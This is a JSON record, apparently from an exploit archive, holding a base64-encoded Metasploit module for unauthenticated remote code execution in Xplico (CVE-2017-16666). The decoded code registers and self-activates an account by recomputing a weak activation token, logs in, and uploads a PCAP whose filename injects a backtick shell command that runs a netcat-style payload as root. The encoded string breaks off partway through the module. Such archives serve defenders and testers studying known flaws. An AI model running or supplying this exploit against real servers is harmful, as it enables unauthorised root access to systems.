{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cHM6Ly9tZXRhc3Bsb2l0LmNvbS9kb3dubG9hZA0KIyBDdXJyZW50IHNvdXJjZTogaHR0cHM6Ly9naXRodWIuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LWZyYW1ld29yaw0KIyMNCg0KY2xhc3MgTWV0YXNwbG9pdE1vZHVsZSA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQogIFJhbmsgPSBFeGNlbGxlbnRSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6SHR0cENsaWVudA0KDQogIGRlZiBpbml0aWFsaXplKGluZm89e30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICdOYW1lJyAgICAgICAgICAgPT4gJ1hwbGljbyBSZW1vdGUgQ29kZSBFeGVjdXRpb24nLA0KICAgICAgJ0Rlc2NyaXB0aW9uJyAgICA9PiAlcXsNCiAgICAgICAgVGhpcyBtb2R1bGUgZXhwbG9pdHMgY29tbWFuZCBpbmplY3Rpb24gdnVsbmVyYWJpbGl0eS4gVW5hdXRoZW50aWNhdGVkIHVzZXJzIGNhbiByZWdpc3RlciBhIG5ldyBhY2NvdW50IGFuZCB0aGVuIGV4ZWN1dGUgYSB0ZXJtaW5hbA0KICAgICAgICBjb21tYW5kIHVuZGVyIHRoZSBjb250ZXh0IG9mIHRoZSByb290IHVzZXIuDQoNCiAgICAgICAgVGhlIHNwZWNpZmljIGZsYXcgZXhpc3RzIHdpdGhpbiB0aGUgWHBsaWNvLCB3aGljaCBsaXN0ZW5zIG9uIFRDUCBwb3J0IDk4NzYgYnkgZGVmYXVsdC4gVGhlIGdvYWwgb2YgWHBsaWNvIGlzIGV4dHJhY3QgZnJvbSBhbiBpbnRlcm5ldA0KICAgICAgICB0cmFmZmljIGNhcHR1cmUgdGhlIGFwcGxpY2F0aW9ucyBkYXRhIGNvbnRhaW5lZC4gVGhlcmUgaXMgYSBoaWRkZW4gZW5kLXBvaW50IGF0IGluc2lkZSBvZiB0aGUgWHBsaWNvIHRoYXQgYWxsb3cgYW55b25lIHRvIGNyZWF0ZQ0KICAgICAgICBhIG5ldyB1c2VyLiBPbmNlIHRoZSB1c2VyIGNyZWF0ZWQgdGhyb3VnaCAvdXNlcnMvcmVnaXN0ZXIgZW5kcG9pbnQsIGl0IG11c3QgYmUgYWN0aXZhdGVkIHZpYSBhY3RpdmF0aW9uIGUtbWFpbC4gQWZ0ZXIgdGhlIHJlZ2lzdHJhdGlvbiBYcGxpY28gdHJ5DQogICAgICAgIHRvIHNlbmQgZS1tYWlsIHRoYXQgY29udGFpbnMgYWN0aXZhdGlvbiBjb2RlLiBVbmZvcnR1bmV0bHksIHRoaXMgZS1tYWlsIHByb2JhYmx5IG5vdCBnb25uYSByZWFjaCB0byB0aGUgZ2l2ZW4gZS1tYWlsIGFkZHJlc3Mgb24gbW9zdCBvZiBpbnN0YWxsYXRpb24uDQogICAgICAgIEJ1dCBpdCdzIHBvc3NpYmxlIHRvIGNhbGN1bGF0ZSBleGFjdGx5IHNhbWUgdG9rZW4gdmFsdWUgYmVjYXVzZSBvZiBpbnNlY3VyZSBjcnlwdG9ncmFwaGljIHJhbmRvbSBzdHJpbmcgZ2VuZXJhdG9yIGZ1bmN0aW9uIHVzYWdlLg0KDQogICAgICAgIE9uZSBvZiB0aGUgZmVhdHVyZSBvZiBYcGxpY28gaXMgcmVsYXRlZCB0byB0aGUgcGFyc2luZyBQQ0FQIGZpbGVzLiBPbmNlIFBDQVAgZmlsZSB1cGxvYWRlZCwgWHBsaWNvIGV4ZWN1dGUgYW4gb3BlcmF0aW5nIHN5c3RlbSBjb21tYW5kIGluIG9yZGVyIHRvIGNhbGN1bGF0ZSBjaGVja3N1bQ0KICAgICAgICBvZiB0aGUgZmlsZS4gTmFtZSBvZiB0aGUgZm9yIHRoaXMgb3BlcmF0aW9uIGlzIGRpcmVjbHR5IHRha2VuIGZyb20gdXNlciBpbnB1dCBhbmQgdGhlbiB1c2VkIGF0IGluc2lkZSBvZiB0aGUgY29tbWFuZCB3aXRob3V0IHByb3BlciBpbnB1dCB2YWxpZGF0aW9uLg0KICAgICAgfSwNCiAgICAgICdMaWNlbnNlJyAgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KICAgICAgJ0F1dGhvcicgICAgICAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgICdNZWhtZXQgSW5jZSA8bWVobWV0QG1laG1ldGluY2UubmV0PicgICMgYXV0aG9yICYgbXNmIG1vZHVsZQ0KICAgICAgICBdLA0KICAgICAgJ1JlZmVyZW5jZXMnICAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsnQ1ZFJywgJzIwMTctMTY2NjYnXSwNCiAgICAgICAgICBbJ1VSTCcsICdodHRwczovL3BlbnRlc3QuYmxvZy9hZHZpc29yeS14cGxpY28tdW5hdXRoZW50aWNhdGVkLXJlbW90ZS1jb2RlLWV4ZWN1dGlvbi1jdmUtMjAxNy0xNjY2Ni8nXSwNCiAgICAgICAgICBbJ1VSTCcsICdodHRwczovL3d3dy54cGxpY28ub3JnL2FyY2hpdmVzLzE1MzgnXQ0KICAgICAgICBdLA0KICAgICAgJ1ByaXZpbGVnZWQnICAgICAgPT4gdHJ1ZSwNCiAgICAgICdQbGF0Zm9ybScgICAgICAgID0+IFsndW5peCddLA0KICAgICAgJ0FyY2gnICAgICAgICAgICAgPT4gQVJDSF9DTUQsDQogICAgICAnRGVmYXVsdE9wdGlvbnMnICA9Pg0KICAgICAgICB7DQogICAgICAgICAgJ1JQT1JUJyA9PiA5ODc2DQogICAgICAgIH0sDQogICAgICAnUGF5bG9hZCcgPT4NCiAgICAgICAgew0KICAgICAgICAgICdTcGFjZScgICAgICAgPT4gMjUyLA0KICAgICAgICAgICdEaXNhYmxlTm9wcycgPT4gdHJ1ZSwNCiAgICAgICAgICAnQmFkQ2hhcnMnID0+ICIvIiIsDQogICAgICAgICAgJ0NvbXBhdCcgPT4NCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgJ1BheWxvYWRUeXBlJyA9PiAnY21kJywNCiAgICAgICAgICAgICAgJ1JlcXVpcmVkQ21kJyA9PiAnZ2VuZXJpYyBuZXRjYXQgZ2F3aycsICMgb3RoZXIgY21kIHBheWxvYWRzIGNhbid0IGZpdCB3aXRoaW4gMjUyIHNwYWNlIGR1ZSB0byBiYWRjaGFycy4NCiAgICAgICAgICAgIH0sDQogICAgICAgIH0sDQogICAgICAnVGFyZ2V0cycgICAgICAgICA9PiBbIFsnQXV0b21hdGljJywge31dIF0sDQogICAgICAnRGlzY2xvc3VyZURhdGUnICA9PiAnT2N0IDI5IDIwMTcnLA0KICAgICAgJ0RlZmF1bHRUYXJnZXQnICAgPT4gMA0KICAgICkpDQoNCiAgZW5kDQoNCiAgZGVmIGNoZWNrDQogICAgIyBUaGVyZSBpcyBubyBleGFjdCB3YXkgdG8gdW5kZXJzdGFuZCB2YWxpZGl0eSBvZiB2dWxuZXJhYmlsaXR5IHdpdGhvdXQgcmVnaXN0ZXJpbmcgbmV3IHVzZXIgYXMgd2VsbCBhcyB0cmlnZ2VyIHRoZSBjb21tYW5kIGluamVjdGlvbi4NCiAgICAjIHdoaWNoIGlzIG5vdCBzb21ldGhpbmcgd2Ugd2FudCB0byBkbyBmb3Igb25seSBjaGVjay4uIQ0KICAgIHJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koDQogICAgICAnbWV0aG9kJyA9PiAnR0VUJywNCiAgICAgICd1cmknID0+IG5vcm1hbGl6ZV91cmkodGFyZ2V0X3VyaS5wYXRoLCAndXNlcnMnLCAncmVnaXN0ZXInKSwNCiAgICApDQogICAgaWYgcmVzICYmIHJlcy5jb2RlID09IDMwMg0KICAgICAgRXhwbG9pdDo6Q2hlY2tDb2RlOjpTYWZlDQogICAgZWxzZQ0KICAgICAgRXhwbG9pdDo6Q2hlY2tDb2RlOjpVbmtub3duDQogICAgZW5kDQogIGVuZA0KDQogIGRlZiBpbml0aWF0ZV9zZXNzaW9uDQogICAgcHJpbnRfc3RhdHVzKCdJbml0aWF0aW5nIG5ldyBzZXNzaW9uIG9uIHNlcnZlciBzaWRlJykNCiAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKA0KICAgICAgJ21ldGhvZCcgPT4gJ0dFVCcsDQogICAgICAndXJpJyA9PiBub3JtYWxpemVfdXJpKHRhcmdldF91cmkucGF0aCwgJ3VzZXJzJywgJ2xvZ2luJyksDQogICAgKQ0KICAgIGlmIHJlcyAmJiByZXMuY29kZSA9PSAyMDANCiAgICAgIHJlcy5nZXRfY29va2llcw0KICAgIGVsc2UNCiAgICAgIG5pbA0KICAgIGVuZA0KDQogIGVuZA0KDQogIGRlZiByZWdpc3Rlcl91c2VyKHVzZXJuYW1lLCBwYXNzd29yZCkNCiAgICAjIEZpcnN0IHRoaW5nIGZpcnN0LCB3ZSBuZWVkIHRvIGdldCBjc3JmIHRva2VuIGZyb20gcmVnaXN0cmF0aW9uIGZvcm0uDQogICAgcHJpbnRfc3RhdHVzKCdSZWdpc3RlcmluZyBhIG5ldyB1c2VyJykNCg0KICAgIHJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koDQogICAgICAnbWV0aG9kJyA9PiAnR0VUJywNCiAgICAgICd1cmknID0+IG5vcm1hbGl6ZV91cmkodGFyZ2V0X3VyaS5wYXRoLCAndXNlcnMnLCAncmVnaXN0ZXInKSwNCiAgICAgICdjb29raWUnID0+IEBjb29raWUNCiAgICApDQoNCiAgICBpZiByZXMgJiYgcmVzLmNvZGUgPT0gMjAwDQogICAgICBjc3JmX3Rva2VuID0gcmVzLmdldF9oaWRkZW5faW5wdXRzLmZpcnN0WydkYXRhW19Ub2tlbl1ba2V5XSddIHx8IG5pbA0KICAgICAgZmllbGRzID0gcmVzLmdldF9oaWRkZW5faW5wdXRzLmZpcnN0WydkYXRhW19Ub2tlbl1bZmllbGRzXSddIHx8IG5pbA0KICAgIGVuZA0KDQogICAgaWYgY3NyZl90b2tlbi5uaWw/IHx8IGZpZWxkcy5uaWw/DQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6VW5rbm93biwgJ1VuYWJsZSB0byBleHRhY3QgaGlkZGVuIGZpZWxkcyBmcm9tIHJlZ2lzdHJhdGlvbiBmb3JtLicpDQogICAgZW5kDQoNCiAgICAjIHJhbmRfbWFpbF9hZGRyZXNzIHNvbWV0aW1lcyBnZW5lcmF0ZXMgYnVnZ3kgZW1haWwgYWRkcmVzcyBmb3IgdGhpcyBhcHAuIFNvIHdlIG1hbnVhbGx5IGdlbmVyYXRlIGVtYWlsIGFkZHJlc3MgaW4gaGVyZS4NCiAgICBlbWFpbCA9ICcnDQogICAgZW1haWwgPDwgcmFuZF90ZXh0X2FscGhhX2xvd2VyKHJhbmQoMTApKzQpDQogICAgZW1haWwgPDwgJ0AnDQogICAgZW1haWwgPDwgcmFuZF90ZXh0X2FscGhhX2xvd2VyKHJhbmQoMTApKzQpDQogICAgZW1haWwgPDwgJy4nDQogICAgZW1haWwgPDwgcmFuZF90ZXh0X2FscGhhX2xvd2VyKHJhbmQoMSkrMikNCg0KICAgICMgQ3JlYXRlIHVzZXINCiAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKA0KICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLA0KICAgICAgJ3VyaScgPT4gbm9ybWFsaXplX3VyaSh0YXJnZXRfdXJpLnBhdGgsICd1c2VycycsICdyZWdpc3RlcicpLA0KICAgICAgJ2Nvb2tpZScgPT4gQGNvb2tpZSwNCiAgICAgICd2YXJzX3Bvc3QnID0+IHsNCiAgICAgICAgJ19tZXRob2QnID0+ICdQT1NUJywNCiAgICAgICAgJ2RhdGFbX1Rva2VuXVtrZXldJyA9PiBjc3JmX3Rva2VuLA0KICAgICAgICAnZGF0YVtVc2VyXVtlbWFpbF0nID0+IGVtYWlsLA0KICAgICAgICAnZGF0YVtVc2VyXVt1c2VybmFtZV0nID0+IHVzZXJuYW1lLA0KICAgICAgICAnZGF0YVtVc2VyXVtwYXNzd29yZF0nID0+IHBhc3N3b3JkLA0KICAgICAgICAnZGF0YVtfVG9rZW5dW2ZpZWxkc10nID0+IGZpZWxkcywNCiAgICAgICAgJ2RhdGFbX1Rva2VuXVt1bmxvY2tlZF0nID0+ICcnLA0KICAgICAgfQ0KICAgICkNCg0KICAgIGlmIHJlcyAmJiByZXMuY29kZSA9PSAzMDINCiAgICAgIHByaW50X2dvb2QoJ05ldyB1c2VyIHN1Y2Nlc3NmdWxseSByZWdpc3RlcmVkJykNCiAgICAgIHByaW50X3N0YXR1cygiVXNlcm5hbWU6ICN7dXNlcm5hbWV9IikNCiAgICAgIHByaW50X3N0YXR1cygiUGFzc3dvcmQ6ICN7cGFzc3dvcmR9IikNCiAgICBlbHNlDQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6VW5rbm93biwgJ0NvdWxkIG5vdCByZWdpc3RlciBuZXcgdXNlcicpDQogICAgZW5kDQoNCiAgICAjIEF3ZXNvbWUuIFdlIGhhdmUgdXNlci4gV2UgbmVlZCB0byBhY3RpdmF0ZSBpdCBtYW51YWxseS4uIQ0KICAgIHByaW50X3N0YXR1cygnQ2FsY3VsYXRpbmcgZW1fa2V5IGNvZGUgb2YgdGhlIHVzZXInKQ0KDQogICAgdW5peHRpbWUgPSBUaW1lLnBhcnNlKHJlcy5oZWFkZXJzWydEYXRlJ10pLnRvX2kNCiAgICBwYXNzd29yZF9tZDUgPSBSZXg6OlRleHQubWQ1KHBhc3N3b3JkKQ0KICAgIGVtX2tleSA9IFJleDo6VGV4dC5tZDUoDQogICAgICAiI3tlbWFpbH0je3Bhc3N3b3JkX21kNX0je3VuaXh0aW1lfSINCiAgICApDQogICAgcHJpbnRfc3RhdHVzKCJBY3RpdmF0aW5nIHVzZXIgd2l0aCBlbV9rZXkgPSAje2VtX2tleX0iKQ0KDQogICAgIyBXZSBuZWVkIHRvIGZvbGxvdyByZWRpcmVjdGlvbnMuIEV2ZW4gaWYgd2UgbWFuYWdlZCB0byBmaW5kIGVtX2tleS4NCiAgICAjIEl0IHdpbGwgcmVkaXJlY3QgdXMgdG8gdGhlIGxvZ2luIGZvcm0uIFdlIG5lZWQgdG8gc2VlIHJlZ2lzdHJhdGlvbiBjb21wbGV0ZWQgb24gZmluYWwgcGFnZS4NCiAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpISgNCiAgICAgICdtZXRob2QnID0+ICdHRVQnLA0KICAgICAgJ3VyaScgPT4gbm9ybWFsaXplX3VyaSh0YXJnZXRfdXJpLnBhdGgsICd1c2VycycsICdyZWdpc3RlckNvbmZpcm0nLCBlbV9rZXkpLA0KICAgICAgJ2Nvb2tpZScgPT4gQGNvb2tpZQ0KICAgICkNCg0KICAgIGlmIHJlcyAmJiByZXMuY29kZSA9PSAyMDAgJiYgcmVzLmJvZHkuaW5jbHVkZT8oJ1JlZ2lzdHJhdGlvbiBDb21wbGV0ZWQuJykNCiAgICAgIHByaW50X2dvb2QoJ1VzZXIgc3VjY2Vzc2Z1bGx5IGFjdGl2YXRlZCcpDQogICAgZWxzZQ0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6OlVua25vd24sICdDb3VsZCBub3QgYWN0aXZhdGVkIG91ciB1c2VyLiBUYXJnZXQgbWF5IG5vdCBiZSB2dWxuZXJhYmxlLicpDQogICAgZW5kDQogIGVuZA0KDQogIGRlZiBsb2dpbih1c2VybmFtZSwgcGFzc3dvcmQpDQogICAgIyB5ZXQgYW5vdGhlciBjc3JmIHRva2VuIGdhdGhlcmluZy4NCiAgICBwcmludF9zdGF0dXMoJ0F1dGhlbnRpY2F0aW5nIHdpdGggb3VyIGFjdGl2YXRlZCBuZXcgdXNlcicpDQogICAgcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSgNCiAgICAgICdtZXRob2QnID0+ICdHRVQnLA0KICAgICAgJ3VyaScgPT4gbm9ybWFsaXplX3VyaSh0YXJnZXRfdXJpLnBhdGgsICd1c2VycycsICdsb2dpbicpLA0KICAgICAgJ2Nvb2tpZScgPT4gQGNvb2tpZQ0KICAgICkNCg0KICAgIGlmIHJlcyAmJiByZXMuY29kZSA9PSAyMDANCiAgICAgIGNzcmZfdG9rZW4gPSByZXMuZ2V0X2hpZGRlbl9pbnB1dHMuZmlyc3RbJ2RhdGFbX1Rva2VuXVtrZXldJ10gfHwgbmlsDQogICAgICBmaWVsZHMgPSByZXMuZ2V0X2hpZGRlbl9pbnB1dHMuZmlyc3RbJ2RhdGFbX1Rva2VuXVtmaWVsZHNdJ10gfHwgbmlsDQogICAgZW5kDQoNCiAgICBpZiBjc3JmX3Rva2VuLm5pbD8gfHwgZmllbGRzLm5pbD8NCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpVbmtub3duLCAnVW5hYmxlIHRvIGV4dGFjdCBoaWRkZW4gZmllbGRzIGZyb20gbG9naW4gZm9ybS4nKQ0KICAgIGVuZA0KDQogICAgcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSEoDQogICAgICAnbWV0aG9kJyA9PiAnUE9TVCcsDQogICAgICAndXJpJyA9PiBub3JtYWxpemVfdXJpKHRhcmdldF91cmkucGF0aCwgJ3VzZXJzJywgJ2xvZ2luJyksDQogICAgICAnY29va2llJyA9PiBAY29va2llLA0KICAgICAgJ3ZhcnNfcG9zdCcgPT4gew0KICAgICAgICAnX21ldGhvZCcgPT4gJ1BPU1QnLA0KICAgICAgICAnZGF0YVtfVG9rZW5dW2tleV0nID0+IGNzcmZfdG9rZW4sDQogICAgICAgICdkYXRhW1VzZXJdW3VzZXJuYW1lXScgPT4gdXNlcm5hbWUsDQogICAgICAgICdkYXRhW1VzZXJdW3Bhc3N3b3JkXScgPT4gcGFzc3dvcmQsDQogICAgICAgICdkYXRhW19Ub2tlbl1bZmllbGRzXScgPT4gZmllbGRzLA0KICAgICAgICAnZGF0YVtfVG9rZW5dW3VubG9ja2VkXScgPT4gJycsDQogICAgICB9DQogICAgKQ0KDQogICAgaWYgcmVzICYmIHJlcy5ib2R5LmluY2x1ZGU/KCc8YSBocmVmPSIvcG9scyI+Q2FzZXM8L2E+JykNCiAgICAgIHByaW50X2dvb2QoJ1N1Y2Nlc3NmdWxseSBhdXRoZW50aWNhdGVkJykNCiAgICBlbHNlDQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6VW5rbm93biwgJ1VuYWJsZSB0byBsb2dpbi4nKQ0KICAgIGVuZA0KDQogIGVuZA0KDQogIGRlZiBjcmVhdGVfbmV3X2Nhc2UNCiAgICAjIFdlIGxvZ2dlZCBpbi4gTm90IHdlIG5lZWQgdG8gY3JlYXRlIGEgbmV3IHhwbGljbyBjYXNlLg0KICAgIHByaW50X3N0YXR1cygnQ3JlYXRpbmcgbmV3IGNhc2UnKQ0KICAgIHBvbF9uYW1lID0gcmFuZF90ZXh0X2FscGhhX2xvd2VyKHJhbmQoNCkrOCkNCiAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpISgNCiAgICAgICdtZXRob2QnID0+ICdQT1NUJywNCiAgICAgICd1cmknID0+IG5vcm1hbGl6ZV91cmkodGFyZ2V0X3VyaS5wYXRoLCAncG9scycsICdhZGQnKSwNCiAgICAgICdjb29raWUnID0+IEBjb29raWUsDQogICAgICAndmFyc19wb3N0JyA9PiB7DQogICAgICAgICdfbWV0aG9kJyA9PiAnUE9TVCcsDQogICAgICAgICdkYXRhW0NhcHR1cmVdW1R5cGVdJyA9PiAwLA0KICAgICAgICAnZGF0YVtQb2xdW25hbWVdJyA9PiBwb2xfbmFtZSwNCiAgICAgICAgJ2RhdGFbUG9sXVtleHRlcm5hbF9yZWZdJyA9PiAnJywNCiAgICAgIH0NCiAgICApDQoNCiAgICBpZiByZXMgJiYgcmVzLmJvZHkuaW5jbHVkZT8oJ1RoZSBDYXNlIGhhcyBiZWVuIGNyZWF0ZWQnKQ0KICAgICAgcmVzLmJvZHkuc2NhbigvPGEgaHJlZj0iXC9wb2xzXC92aWV3XC8oWzAtOV0rKSI+LykuZmxhdHRlblswXQ0KICAgIGVsc2UNCiAgICAgIG5pbA0KICAgIGVuZA0KICBlbmQNCg0KICBkZWYgY3JlYXRlX25ld19zb2wocG9sX2lkKQ0KICAgICMgU2luY2Ugd2UgeHBsaWNvIGNhc2UsIGl0J3MgdGltZSB0byBjcmVhdGUgYSAic2Vzc2lvbiIgZm9yIHRoaXMgY2FzZS4NCiAgICBwcmludF9zdGF0dXMoJ0NyZWF0aW5nIG5ldyB4cGxpY28gc2Vzc2lvbiBmb3IgcGNhcCcpDQoNCiAgICBzb2xfbmFtZSA9IHJhbmRfdGV4dF9hbHBoYV9sb3dlcihyYW5kKDQpKzgpDQogICAgIyBzb2xzL2FkZCBlbmRwb2ludCByZWFkcyBzZWxlY3RlZCBjYXNlIGlkIHRocm91Z2ggc2Vzc2lvbi4NCiAgICAjIFNvIHdlIG5lZWQgdG8gaGl0IHRoYXQgZW5kLXBvaW50IHNvIHdlIGNhbiBpbnNlcnQgcG9sX2lkIGludG8gdGhlIGN1cnJlbnQgc2Vzc2lvbiBkYXRhLg0KICAgIHNlbmRfcmVxdWVzdF9jZ2khKA0KICAgICAgJ21ldGhvZCcgPT4gJ0dFVCcsDQogICAgICAndXJpJyA9PiBub3JtYWxpemVfdXJpKHRhcmdldF91cmkucGF0aCwgJ3BvbHMnLCAndmlldycsIHBvbF9pZCksDQogICAgICAnY29va2llJyA9PiBAY29va2llLA0KICAgICkNCg0KICAgICMgQ3JlYXRpbmcgbmV3IHNlc3Npb24uDQogICAgcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSEoDQogICAgICAnbWV0aG9kJyA9PiAnUE9TVCcsDQogICAgICAndXJpJyA9PiBub3JtYWxpemVfdXJpKHRhcmdldF91cmkucGF0aCwgJ3NvbHMnLCAnYWRkJyksDQogICAgICAnY29va2llJyA9PiBAY29va2llLA0KICAgICAgJ3ZhcnNfcG9zdCcgPT4gew0KICAgICAgICAnX21ldGhvZCcgPT4gJ1BPU1QnLA0KICAgICAgICAnZGF0YVtTb2xdW25hbWVdJyA9PiBzb2xfbmFtZSwNCiAgICAgIH0NCiAgICApDQoNCiAgICBpZiByZXMgJiYgcmVzLmJvZHkuaW5jbHVkZT8oJ1RoZSBTZXNzaW9uIGhhcyBiZWVuIGNyZWF0ZWQnKQ0KICAgICAgcmVzLmJvZHkuc2NhbigvPGEgaHJlZj0iXC9zb2xzXC92aWV3XC8oWzAtOV0rKSI+LykuZmxhdHRlblswXQ0KICAgIGVsc2UNCiAgICAgIG5pbA0KICAgIGVuZA0KDQogIGVuZA0KDQogIGRlZiB1cGxvYWRfcGNhcChzb2xfaWQpDQogICAgcHJpbnRfc3RhdHVzKCdVcGxvYWRpbmcgbWFsZm9ybWVkIFBDQVAgZmlsZScpDQogICAgIyBXZSBhcmUgaGl0dGluZyB0aGlzIGVuZC1wb2ludCBzbyB3ZSBjYW4gYWNjZXNzIHNvbF9pZCB0aHJvdWdoIHNlc3Npb24gb24gc2VydmVyLXNpZGUuDQogICAgc2VuZF9yZXF1ZXN0X2NnaSEoDQogICAgICAnbWV0aG9kJyA9PiAnR0VUJywNCiAgICAgICd1cmknID0+IG5vcm1hbGl6ZV91cmkodGFyZ2V0X3VyaS5wYXRoLCAnc29scycsICd2aWV3Jywgc29sX2lkKSwNCiAgICAgICdjb29raWUnID0+IEBjb29raWUsDQogICAgKQ0KDQogICAgIyBSZWFkaW5nIG1hbGZvcm1lZCBwY2FwIGZpbGVzLg0KICAgIHBhdGggPSA6OkZpbGUuam9pbihNc2Y6OkNvbmZpZy5kYXRhX2RpcmVjdG9yeSwgJ2V4cGxvaXRzJywgJ0NWRS0yMDE3LTE2NjY2JywgJ2R1bXAucGNhcCcpDQogICAgZmQgPSA6OkZpbGUub3BlbiggcGF0aCwgJ3JiJykNCiAgICBwY2FwID0gZmQucmVhZChmZC5zdGF0LnNpemUpDQogICAgZmQuY2xvc2UNCg0KICAgIGRhdGEgPSBSZXg6Ok1JTUU6Ok1lc3NhZ2UubmV3DQogICAgZGF0YS5hZGRfcGFydCgnUE9TVCcsIG5pbCwgbmlsLCAnZm9ybS1kYXRhOyBuYW1lPSJfbWV0aG9kIicpDQogICAgZGF0YS5hZGRfcGFydChwY2FwLCAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywgbmlsLCAiZm9ybS1kYXRhOyBuYW1lPSJkYXRhW1NvbHNdW0ZpbGVdIjsgZmlsZW5hbWU9ImAje3BheWxvYWQuZW5jb2RlZH0pYCIiKSAjIFllcyBiYWNrLXRpY2sgaW5qZWN0aW9uIQ0KDQogICAgIyBVcGxvYWRpbmcgUENBUCBmaWxlLg0KICAgIHJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koDQogICAgICAnbWV0aG9kJyA9PiAnUE9TVCcsDQogICAgICAndXJpJyA9PiBub3JtYWxpemVfdXJpKHRhcmdldF91cmkucGF0aCwgJ3NvbHMnLCAncGNhcCcpLA0KICAgICAgJ2Nvb2tpZScgPT4gQGNvb2tpZSwNCiAgICAgICdjdHlwZScgICAgPT4gIm11bHRpcGFydC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSN7ZGF0YS5ib3VuZH0iLA0KICAgICAgJ2RhdGEnICAgICA9PiBkYXRhLnRvX3MNCiAgICApDQoNCiAgICBpZiByZXMgJiYgcmVzLmNvZGUgPT0gMzAyDQogICAgICBwcmludF9nb29kKCdQQ0FQIHN1Y2Nlc3NmdWxseSB1cGxvYWRlZC4gUGNhcCBwYXJzZXIgaXMgZ29pbmcgdG8gc3RhcnQgb24gc2VydmVyIHNpZGUuJykNCiAgICBlbmQNCg0KICAgICMgV2UgY2FuIG5vdCB3YWl0IGFsbCB0aGUgZGF5IGxvbmcgdG8gaGF2ZSBzZXNzaW9uLg0KICAgICMgU28gd2UgYXJlIGNoZWNraW5nIHN0YXR1cyBvZiBkZWNvZGluZyBwcm9jZXNzIDUgdGltZXMgd2l0aCBzbGVlcCBmb3IgYSAxIHNlY29uZCBvbiBlYWNoIGxvb3AuDQogICAgaXNfam9iX2RvbmUgPSBuaWwNCiAgICBjb3VudGVyID0gMA0KICAgIHVudGlsIHNlc3Npb25fY3JlYXRlZD8gfHwgIWlzX2pvYl9kb25lLm5pbD8gfHwgY291bnRlciA9PSA1DQogICAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKA0KICAgICAgICAnbWV0aG9kJyA9PiAnR0VUJywNCiAgICAgICAgJ3VyaScgPT4gbm9ybWFsaXplX3VyaSh0YXJnZXRfdXJpLnBhdGgsICdzb2xzJywgJ3ZpZXcnLCBzb2xfaWQpLA0KICAgICAgICAnY29va2llJyA9PiBAY29va2llLA0KICAgICAgKQ0KICAgICAgaWYgcmVzICYmIHJlcy5ib2R5LmluY2x1ZGU/KCdGaWxlIHVwbG9hZGVkLCB3YWl0IHN0YXJ0IGRlY29kaW5nLi4uJykNCiAgICAgICAgcHJpbnRfc3RhdHVzKCdQYXJzaW5nIGhhcyBzdGFydGVkLiBXYWl0IGZvciBwYXJzZXIgdG8gZ2V0IHRoZSBqb2IgZG9uZS4uLicpDQogICAgICBlbmQNCiAgICAgIGlmIHJlcyAmJiByZXMuYm9keS5pbmNsdWRlPygnREVDT0RJTkcnKQ0KICAgICAgICBwcmludF9nb29kKCdXZSBhcmUgYXQgUENBUCBkZWNvZGluZyBwaGFzZS4gTGl0dGxlIGJpdCBtb3JlIHBhdGllbmNlLi4uJykNCiAgICAgIGVuZA0KICAgICAgIyBUYmggZGVjb2RpbmcgcHJvY2VzcyBpcyBub3QgZ29pbmcgdG8gYmUgZmluaXNoZWQgYXMgbG9uZyBhcyB3ZSBoYXZlIG1zZiBzZXNzaW9uLg0KICAgICAgIyBXZSBhcmUgbm90IGdvaW5nIHRvIHNlZSB0aGlzIGNhc2UgaWYgd2UgYXJlIHN1Y2Nlc3NmdWwgZXhwbG9pdGluZy4NCiAgICAgIGlmIHJlcyAmJiByZXMuYm9keS5pbmNsdWRlPygnREVDT0RJTkcgQ09NUExFVEVEJykNCiAgICAgICAgcHJpbnRfd2FybmluZygnUENBUCBwYXJzaW5nIHByb2Nlc3MgaGFzIGZpbmlzaGVkLiBIYXZlbid0IHlvdSBnb3QgeW91ciBzaGVsbCA/JykNCiAgICAgICAgaXNfam9iX2RvbmUgPSAxDQogICAgICAgIG5leHQNCiAgICAgIGVuZA0KICAgICAgc2xlZXAoMSkNCiAgICAgIGNvdW50ZXIgKz0gMQ0KICAgIGVuZA0KDQogIGVuZA0KDQogIGRlZiBleHBsb2l0DQoNCiAgICBpZiBjaGVjayA9PSBFeHBsb2l0OjpDaGVja0NvZGU6OlNhZmUNCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpOb3RWdWxuZXJhYmxlLCAiI3twZWVyfSAtIFRhcmdldCBub3QgdnVsbmVyYWJsZSIpDQogICAgZW5kDQoNCiAgICAjIFdlIG5lZWQgdG8gYWNjZXNzIGNvb2tpZSBmcm9tIGV2ZXJ5d2hlcmUuIFRodXMgbWFraW5nIGl0IGdsb2JhbCB2YXJpYWJsZS4NCiAgICBAY29va2llID0gaW5pdGlhdGVfc2Vzc2lvbg0KICAgIGlmIEBjb29raWUubmlsPw0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6OlVua25vd24sICdVbmFibGUgdG8gaW5pdGlhdGUgbmV3IHNlc3Npb25pZCBvbiBzZXJ2ZXIuJykNCi